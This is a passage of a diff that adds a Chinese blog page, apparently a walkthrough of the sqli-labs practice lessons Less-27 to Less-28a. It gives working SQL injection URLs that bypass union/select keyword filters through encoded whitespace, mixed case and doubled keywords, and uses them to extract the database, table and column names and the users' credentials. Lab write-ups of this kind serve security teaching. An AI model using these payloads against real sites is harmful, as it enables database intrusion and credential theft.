<span class="number">31</span>: <span class="comment"># 单条查询结果已被遍历</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(char)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    sys.stdout.write(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br></pre></td></tr></table></figure>
+
+<p>参考原文：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ff72f2c6d99c">https://www.jianshu.com/p/ff72f2c6d99c</a></p>
+<hr>
+<h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-27</strong></p>
+<p>源码分析：</p>
+<p>在Less-26的基础上Less-27将<code>union</code>和<code>select</code>字段进行了过滤：</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209145938742.png" alt="image-20220209145938742"></p>
+<p><strong><code>\s</code>表示空白字符空格、制表符、换页符等，<code>/i</code>表示忽略大小写。</strong></p>
+<h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>使用编码注入判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27/?id=1&#x27;%0band%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209150455232.png" alt="image-20220209150455232"></p>
+<p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27/?id=1&#x27; and(extractvalue(1,concat(0x7e,database(),0x7e)))and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209151300652.png" alt="image-20220209151300652"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27/?id=1&#x27; and(extractvalue(1,concat(0x7e,(seselselectectlect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)))and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209151357185.png" alt="image-20220209151357185"></p>
+<p>后续过程如以往。</p>
+<hr>
+<h2 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-27a</strong></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27a/?id=1&quot; &quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152251922.png" alt="image-20220209152251922"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27a/?id=9999&quot;%0bUNiON%0bSElECT%0b1,2,3%0bor%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152519463.png" alt="image-20220209152519463"></p>
+<p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27a/?id=9999&quot;%0bUNiON%0bSELeCT%0b1,database(),3%0bor%0b&quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152730899.png" alt="image-20220209152730899"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27a/?id=9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(table_name),3%0bFROM%0binformation_schema.tables%0bWHERE%0btable_schema = &#x27;security&#x27;%0bor%0b&quot;1&quot;=&quot;2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209152850481.png" alt="image-20220209152850481"></p>
+<p>爆字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27a/?id=9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(column_name),3%0bFROM%0binformation_schema.columns%0bWHERE%0btable_schema=&#x27;security&#x27;%0bAND%0btable_name=&#x27;users&#x27;%0bor%0b&quot;1&quot;=&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153059934.png" alt="image-20220209153059934"></p>
+<p>爆内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-27a/?id=9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(concat_ws(&quot;:&quot;,username,password)),3%0bFROM%0busers%0bWHERE%0b&quot;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153308600.png" alt="image-20220209153308600"></p>
+<hr>
+<h2 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-28</strong></p>
+<p>判断注入点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-28/?id=1&#x27;) OR (&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153509042.png" alt="image-20220209153509042"></p>
+<p>判断字段数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-28/?id=1&#x27;)%0bORDER%0bBY%0b3%0bor%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209153601689.png" alt="image-20220209153601689"></p>
+<p>判断回显点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-28/?id=1.1&#x27;)union(select%0d1,2,&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209154702357.png" alt="image-20220209154702357"></p>
+<p>爆库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-28/?id=1.1&#x27;)union(select%0d1,(select(group_concat(schema_name))from(information_schema.schemata) ),&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209154757665.png" alt="image-20220209154757665"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-28/?id=1.1&#x27;)union(select%0d1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()) ),&#x27;3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209154840411.png" alt="image-20220209154840411"></p>
+<hr>
+<h2 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h2><p><strong>Less-28a</strong></p>
+<p>盲注，只过滤了union+select，单引号括号闭合。可以使用空格和注释</p>
+<p><img src="/2022/02/08/SQL%E6%B3%A8%E5%85%A5-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220209155123396.png" alt="image-20220209155123396"></p>
+<h2 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h2><p>布尔盲注猜字段：</p>
+<p>数据库长度：<code>?id=1&#39;) and length((database()))=8 --+</code></p>
+<p>猜数据库名：<code>?id=1&#39;) and substr((select database()),1,1)=&quot;s&quot; --+</code></p>
+<p>猜表长：<code>?id=1&#39;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1) )=6 --+</code></p>
+<p>猜表名：<code>?id=1&#39;) and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&quot;e&quot; --+</code></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>  Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.xml"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
